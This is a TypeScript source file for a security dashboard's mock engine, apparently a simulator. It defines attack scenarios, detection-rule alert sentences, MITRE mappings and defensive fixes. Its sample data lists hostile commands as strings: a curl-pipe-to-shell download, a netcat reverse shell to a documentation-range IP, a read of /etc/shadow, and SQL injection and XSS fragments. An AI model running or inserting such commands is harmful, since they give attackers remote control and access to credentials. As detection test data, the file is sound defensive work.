// Everything the mock engine knows about the 7 attack scenarios and 2 benign anomalies.
// Sources: docs/DATA_CONTRACT.md and docs/backend/cyber_attack_detection_rules.pdf.
// ATT&CK IDs, severities, windows, D3FEND names and mitigations are PROVISIONAL (security lead to confirm).
import type { AttackType, Severity } from "./types";
import type { Rng } from "./rng";

// Values from the rules document and the generator.
export const HOSTS = ["web-01", "web-02", "auth-01", "db-01"] as const;
export const USERS = ["maria.silva", "j.okafor", "a.nakamura", "r.mehta", "l.moreau", "t.berg", "s.haddad"] as const;
export const SENSITIVE_PATHS = ["/.env", "/.git/config", "/wp-admin/", "/phpmyadmin/", "/server-status", "/actuator/env", "/backup.zip"];
export const INJECTIONS = [
  "SQL injection: UNION SELECT",
  "SQL injection: ' OR '1'='1",
  "SQL injection: SLEEP(",
  "cross-site scripting: <script",
  "path traversal: ../",
];
export const ADMIN_COMMANDS = ["cat /etc/shadow", "curl http://198.51.100.9/x.sh | sh", "useradd -m support2", "crontab -e", "nc -e /bin/sh 198.51.100.9 4444"];
export const SCANNER_UA = "sqlmap/1.7.2#stable";

/** Addresses only from the documentation ranges: never real networks. */
export function randomIp(r: Rng): string {
  const range = r.pick(["203.0.113", "198.51.100", "192.0.2"]);
  return `${range}.${r.int(2, 254)}`;
}

export function formatBytes(bytes: number): string {
  if (bytes >= 1e9) return `${(bytes / 1e9).toFixed(1)} GB`;
  return `${Math.round(bytes / 1e6)} MB`;
}

/** The numbers one incident's sentences share, so its story stays consistent. */
export interface Ctx {
  user: string;
  ip: string;
  ips: string[];
  host: string;
  failures: number;
  accounts: number;
  path: string;
  injection: string;
  command: string;
  bytes: number;
  apiRequests: number;
  pages: number;
  rateX: number;
  ipsPerMin: number;
  errors: number;
  errorPct: number;
  uniquePaths: number;
  loginTime: string;
}

interface RuleDef {
  sentence: (c: Ctx) => string;
  points?: number; // default 20 until the backend publishes the full table (confirm)
}

// Signal sentence templates, exactly as in DATA_CONTRACT.md.
export const RULES: Record<string, RuleDef> = {
  "BF-1": { sentence: (c) => `${c.failures} failed logins for ${c.user} in 5 minutes` },
  "BF-2": { sentence: (c) => `${c.failures + 9} failed logins from ${c.ip} in 5 minutes` },
  "BF-3": { sentence: (c) => `${Math.min(97, 80 + (c.failures % 17))}% of ${c.user}'s logins failed in 5 minutes` },
  "BF-4": { sentence: (c) => `${c.user} logged in successfully after ${c.failures} failures` },
  "CS-1": { sentence: (c) => `${c.ip} tried ${c.accounts} different accounts in 5 minutes` },
  "CS-2": { sentence: (c) => `${c.accounts * 6 + 8} failed logins across ${c.accounts} accounts from ${c.ip}` },
  "CS-3": { sentence: (c) => `${c.ips.length} addresses are targeting the same group of accounts` },
  "ATO-1": { sentence: (c) => `${c.user} logged in from an address never seen for them`, points: 20 }, // new IP
  "ATO-2": { sentence: () => "New address, then a sensitive action within 10 minutes", points: 25 }, // sensitive action
  "ATO-3": { sentence: () => "New address and new browser, with unusually high activity", points: 15 }, // new user agent
  "WS-1": { sentence: (c) => `Requested a sensitive path: ${c.path}` },
  "WS-2": { sentence: (c) => `${c.errors} errors in 1 minute (${c.errorPct}% of requests)` },
  "WS-3": { sentence: (c) => `${c.uniquePaths} different paths requested in 1 minute` },
  "WS-4": { sentence: (c) => `Injection pattern in the request (${c.injection})` },
  "EX-1": { sentence: (c) => `${formatBytes(c.bytes)} transferred in a single transfer` },
  "EX-2": { sentence: (c) => `${c.user} moved ${formatBytes(c.bytes * 1.4)} in 10 minutes, far above their normal` },
  "EX-3": { sentence: (c) => `${c.apiRequests} API requests in 5 minutes`, points: 30 }, // high API activity
  "EX-4": { sentence: (c) => `${c.pages} pages fetched in sequence` },
  "EX-5": { sentence: () => "Unusual login followed by a large transfer", points: 20 }, // unusual login context
  "AA-1": { sentence: (c) => `Admin login at ${c.loginTime}, outside working hours`, points: 20 }, // unusual login context
  "AA-2": { sentence: (c) => `Suspicious command: ${c.command}` },
  "AA-3": { sentence: () => "Admin login, suspicious command and large transfer in one window" },
  "HF-1": { sentence: (c) => `Requests per second at ${c.rateX}x normal` },
  "HF-2": { sentence: (c) => `${c.ipsPerMin} different addresses per minute, far above normal` },
  "HF-3": { sentence: () => "Responses slowing and server errors rising" },
  "HF-4": { sentence: () => "Rate spike, source spike and server errors together" },
};

export const AI_POINTS = 20;

interface FixDef {
  actionId: string;
  name: string;
  d3fend: string; // technique name; "" = not mapped yet (shows PENDING)
  confidence: number; // typical CRIE confidence for this attack type
}

export interface ScenarioDef {
  name: string;
  mitre: { id: string; name: string; tactic: string };
  severity: Severity;
  windowMin: number;
  /** The order rules usually fire in as the attack escalates. */
  path: string[];
  aiPattern: string; // "AI engine: this ___ pattern is unusual"
  fixes: FixDef[];
  /** Why CRIE picked a fix: feature, plain sentence, value. */
  reasons: (c: Ctx) => { feature: string; sentence: string; value: string | number }[];
  /** MITRE mitigations for the "no fix was confident enough" fallback. */
  mitigations: { id: string; name: string }[];
}

const ACTIONS = {
  block_ips: { actionId: "block_ips", name: "Block source IPs", d3fend: "Inbound Traffic Filtering" },
  rate_limit_login: { actionId: "rate_limit_login", name: "Rate-limit login endpoint", d3fend: "" },
  enable_mfa: { actionId: "enable_mfa", name: "Enable MFA", d3fend: "Multi-factor Authentication" },
  reset_credentials: { actionId: "reset_credentials", name: "Reset credentials", d3fend: "Credential Rotation" },
  lock_account: { actionId: "lock_account", name: "Lock account", d3fend: "Account Locking" },
  revoke_sessions: { actionId: "revoke_sessions", name: "Revoke active sessions", d3fend: "Session Termination" },
  alert_owner: { actionId: "alert_owner", name: "Alert account owner", d3fend: "" },
  waf_injection: { actionId: "waf_injection", name: "Add WAF rule for injection patterns", d3fend: "Inbound Traffic Filtering" },
  block_paths: { actionId: "block_paths", name: "Block sensitive paths", d3fend: "" },
  throttle_api: { actionId: "throttle_api", name: "Throttle API access for user", d3fend: "" },
  suspend_export: { actionId: "suspend_export", name: "Suspend data export", d3fend: "" },
  disable_admin: { actionId: "disable_admin", name: "Disable admin account", d3fend: "Account Locking" },
  kill_process: { actionId: "kill_process", name: "Kill suspicious process", d3fend: "Process Termination" },
  edge_challenge: { actionId: "edge_challenge", name: "Challenge traffic at the edge", d3fend: "" },
};
const fix = (a: keyof typeof ACTIONS, confidence: number): FixDef => ({ ...ACTIONS[a], confidence });

const T1110_MITIGATIONS = [
  { id: "M1032", name: "Multi-factor Authentication" },
  { id: "M1036", name: "Account Use Policies" },
  { id: "M1027", name: "Password Policies" },
];

export const SCENARIOS: Record<AttackType, ScenarioDef> = {
  brute_force: {
    name: "Brute force",
    mitre: { id: "T1110.001", name: "Password Guessing", tactic: "Credential Access" },
    severity: 3, // 5 once BF-4 fires
    windowMin: 10,
    path: ["BF-2", "BF-1", "BF-3", "BF-4"],
    aiPattern: "login",
    fixes: [fix("lock_account", 0.86), fix("rate_limit_login", 0.8), fix("block_ips", 0.74)],
    reasons: (c) => [
      { feature: "failed_logins_user_5m", sentence: `${c.failures} failed logins for one account`, value: c.failures },
      { feature: "failed_logins_ip_5m", sentence: `Most attempts come from ${c.ip}`, value: c.failures + 9 },
      { feature: "failure_rate_user_5m", sentence: "Almost every login for this account failed", value: 0.9 },
    ],
    mitigations: T1110_MITIGATIONS,
  },
  credential_stuffing: {
    name: "Credential stuffing",
    mitre: { id: "T1110.004", name: "Credential Stuffing", tactic: "Credential Access" },
    severity: 4,
    windowMin: 10,
    path: ["CS-1", "CS-2", "CS-3"],
    aiPattern: "login",
    fixes: [fix("enable_mfa", 0.88), fix("rate_limit_login", 0.81), fix("edge_challenge", 0.76)],
    reasons: (c) => [
      { feature: "unique_users_ip_5m", sentence: `One address tried ${c.accounts} different accounts`, value: c.accounts },
      { feature: "distinct_ips_campaign", sentence: `The attack is spread over ${c.ips.length} addresses`, value: c.ips.length },
      { feature: "failed_logins_ip_5m", sentence: `${c.accounts * 6 + 8} failed logins in 5 minutes`, value: c.accounts * 6 + 8 },
    ],
    mitigations: T1110_MITIGATIONS,
  },
  account_takeover: {
    name: "Account takeover",
    mitre: { id: "T1078", name: "Valid Accounts", tactic: "Initial Access" },
    severity: 5,
    windowMin: 5,
    path: ["ATO-1", "ATO-3", "ATO-2"],
    aiPattern: "session",
    fixes: [fix("revoke_sessions", 0.9), fix("reset_credentials", 0.85), fix("alert_owner", 0.72)],
    reasons: (c) => [
      { feature: "new_ip_user", sentence: `${c.user} is logged in from a new address`, value: c.ip },
      { feature: "sensitive_action_10m", sentence: "A sensitive action followed within minutes", value: 1 },
      { feature: "new_user_agent_user", sentence: "The browser has never been seen for this account", value: 1 },
    ],
    mitigations: [
      { id: "M1027", name: "Password Policies" },
      { id: "M1026", name: "Privileged Account Management" },
      { id: "M1018", name: "User Account Management" },
    ],
  },
  web_scan: {
    name: "Web scan and probing",
    mitre: { id: "T1595.003", name: "Wordlist Scanning", tactic: "Reconnaissance" }, // T1190 once WS-4 fires
    severity: 2, // 3 with WS-4
    windowMin: 15,
    path: ["WS-1", "WS-3", "WS-2", "WS-4"],
    aiPattern: "request",
    fixes: [fix("waf_injection", 0.87), fix("block_paths", 0.83), fix("block_ips", 0.79)],
    reasons: (c) => [
      { feature: "sensitive_path_hits_1m", sentence: `Requests for ${c.path} and similar files`, value: c.path },
      { feature: "unique_paths_ip_1m", sentence: `${c.uniquePaths} different paths in one minute`, value: c.uniquePaths },
      { feature: "user_agent", sentence: "The client identifies itself as a scanning tool", value: SCANNER_UA },
    ],
    mitigations: [
      { id: "M1056", name: "Pre-compromise" },
      { id: "M1050", name: "Exploit Protection" },
      { id: "M1016", name: "Vulnerability Scanning" },
    ],
  },
  data_exfiltration: {
    name: "Data exfiltration",
    mitre: { id: "T1567", name: "Exfiltration Over Web Service", tactic: "Exfiltration" },
    severity: 5,
    windowMin: 10,
    path: ["EX-3", "EX-4", "EX-2", "EX-1", "EX-5"],
    aiPattern: "transfer",
    fixes: [fix("suspend_export", 0.89), fix("throttle_api", 0.84), fix("revoke_sessions", 0.77)],
    reasons: (c) => [
      { feature: "bytes_out_user_10m", sentence: `${formatBytes(c.bytes * 1.4)} moved in 10 minutes`, value: formatBytes(c.bytes * 1.4) },
      { feature: "api_requests_user_5m", sentence: `${c.apiRequests} API requests in 5 minutes`, value: c.apiRequests },
      { feature: "sequential_pages_user", sentence: `${c.pages} pages fetched in order, like a script`, value: c.pages },
    ],
    mitigations: [
      { id: "M1057", name: "Data Loss Prevention" },
      { id: "M1021", name: "Restrict Web-Based Content" },
    ],
  },
  admin_abuse: {
    name: "Admin abuse",
    mitre: { id: "T1078.003", name: "Local Accounts", tactic: "Privilege Escalation" },
    severity: 5,
    windowMin: 5,
    path: ["AA-1", "AA-2", "AA-3"],
    aiPattern: "admin session",
    fixes: [fix("disable_admin", 0.9), fix("kill_process", 0.87), fix("revoke_sessions", 0.8)],
    reasons: (c) => [
      { feature: "admin_login_hour", sentence: `Admin login at ${c.loginTime}, far outside working hours`, value: c.loginTime },
      { feature: "suspicious_process", sentence: `Ran ${c.command}`, value: c.command },
      { feature: "bytes_out_after_command", sentence: "A large transfer followed the command", value: formatBytes(c.bytes) },
    ],
    mitigations: [
      { id: "M1027", name: "Password Policies" },
      { id: "M1026", name: "Privileged Account Management" },
    ],
  },
  http_flood: {
    name: "HTTP flood",
    mitre: { id: "T1499.002", name: "Service Exhaustion Flood", tactic: "Impact" },
    severity: 4,
    windowMin: 3,
    path: ["HF-1", "HF-2", "HF-3", "HF-4"],
    aiPattern: "traffic",
    fixes: [fix("edge_challenge", 0.88), fix("block_ips", 0.71), fix("rate_limit_login", 0.58)],
    reasons: (c) => [
      { feature: "requests_per_second_ratio", sentence: `Traffic at ${c.rateX}x the normal rate`, value: c.rateX },
      { feature: "unique_ips_per_minute", sentence: `${c.ipsPerMin} addresses per minute, too many to block one by one`, value: c.ipsPerMin },
      { feature: "error_rate_5xx", sentence: "Server errors rising as responses slow", value: 0.18 },
    ],
    mitigations: [{ id: "M1037", name: "Filter Network Traffic" }],
  },
  // The AI engine alone, naming no known attack. No MITRE technique and no standard mitigations:
  // nothing is claimed that the model did not say.
  unusual_activity: {
    name: "Unusual activity",
    mitre: { id: "", name: "", tactic: "" },
    severity: 2,
    windowMin: 10,
    path: [],
    aiPattern: "activity",
    fixes: [],
    reasons: () => [],
    mitigations: [],
  },
};

/** The attacks the simulated feed plays. "Unusual activity" only comes from a real model on the live backend. */
export const ATTACK_TYPES = (Object.keys(SCENARIOS) as AttackType[]).filter((t) => t !== "unusual_activity");

export const BENIGN = {
  flash_crowd: {
    name: "Flash crowd",
    sentence: (x: number) => `Traffic up ${x}x, but users, paths and success rate look normal.`,
    checks: ["traffic spike detected", "user distribution looks normal", "requested paths look normal", "login success rate looks normal"],
  },
  nightly_backup: {
    name: "Nightly backup",
    sentence: () => "Large transfer from db-01, but it matches the nightly backup job.",
    checks: ["user is svc_backup", "process is pg_dump --format=custom appdb", "known database host (db-01)", "expected backup time"],
  },
} as const;
